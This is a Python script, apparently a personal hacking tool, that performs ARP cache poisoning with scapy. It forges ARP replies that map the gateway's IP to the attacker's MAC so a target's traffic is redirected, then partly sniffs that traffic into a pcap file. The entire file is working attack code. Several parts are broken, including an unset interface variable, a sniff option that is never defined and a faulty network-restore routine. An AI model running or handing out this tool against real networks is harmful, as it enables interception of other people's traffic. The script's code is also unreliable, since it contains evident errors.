# ARP Cache Poison
# Author: Nathan Bellew
import os
import sys
from scapy.all import *
from optparse import OptionParser
import signal
import logging
from time import sleep
import threading
import netifaces

gateways = netifaces.gateways()
host = gateways['default'][2][0]


logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def main():

    if os.geteuid() != 0:
        print("[-] Run me as root")
        sys.exit(1)

    usage = 'Usage: %prog [-i interface] [-t target] [-h ]'
    parser = OptionParser(usage)
    parser.add_option('-i', dest='interface', help='Select interface to use.')
    parser.add_option('-t', dest='target', help='specify target to ARP poison')
    #parser.add_option('-h', dest='Help', help='prints this help screen or a help screen for any option')
    #one day sniff ill add you, one day.
    parser.add_option('-s', action='store_true', dest='summary', default=False, help='Show packet summary and ask for confirmation before poisoning')
    (options, args) = parser.parse_args()

    if options.interface is None:
        mac = get_if_hwaddr(interface)
        interface=gateways['default'][2][1]
    else:
        mac = get_if_hwaddr(options.interface)
        interface = options.interface

    def build_req(target, host):
        if target is None:
            pkt = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / ARP(hwsrc=mac, psrc=host, pdst=host)
        elif options.target:
            target_mac = getmacbyip(target)
            if target_mac is None:
                print("[-] Unable to resolve MAC address please try another target")
                sys.exit(1)
            else:
                pkt = Ether(src=mac, dst=target_mac) / ARP(hwsrc=mac, psrc=host, pdst=target, op=2)
        else:
            print("[-] Unable to resolve target\nPlease retry new ip remember 1.2.3.4 standard")
        return pkt

    def arp_poison(pkt):
        print("Host located at ", host)
        if options.target is None:
            print("Test Target (no ip)\nMAC = FF:FF:FF:FF:FF:FF")
        else:
            print("Target located at ",options.target,"\nMAC = ", getmacbyip(options.target))
        print("[*] Started ARP Poison Attack [CTRL-C] to Stop!")
        try:
            while True:
                print('.',end='')
                sendp(pkt, inter=2, iface=options.interface)
                time.sleep(3)
        except KeyboardInterrupt:
            print("[*] Stopped ARP Poison Attack. Restoring Network")

    def reARP(signal, frame):
        #Poison_Thread.stop()
        sleep(1)
        print("\n[*] reARPing network")

        rearp_mac = getmacbyip(host)
        pkt = Ether(src=rearp_mac, dst = 'ff:ff:ff:ff:ff:ff')  / ARP(psrc=options.target, hwsrc=mac, op=2)
        sendp(pkt, inter=1, count=5, iface=options.interface)

        sys.exit(0)

    signal.signal(signal.SIGINT, reARP)

    pkt = build_req(options.target, host)

    if options.summary:
        pkt.show()
        #r_pkt.show()
        ans = input('\n[*] Continue? [Y|N]: ').lower()

        if ans =='y' or len(ans) == 0:
            pass

        else:
            sys.exit()

    arp_poison(pkt)
    #Poison_Thread = threading.Thread(target=arp_poison, args=(pkt))
    #Poison_Thread.start()
    #Attempt to setup multi threading

    if options.sniff:
        try:
            sniff_filter = "ip host" + options.target
            print(f"[*] Starting network capture. Filter: {sniff_filter}")
            packets = sniff(filter=sniff_filter, iface=interface, count = 1000)
            wrpcap(options.target + "_capture.pcap", packets)
        except KeyboardInterrupt:
            print("Game Over?")




if __name__=="__main__":
    main()
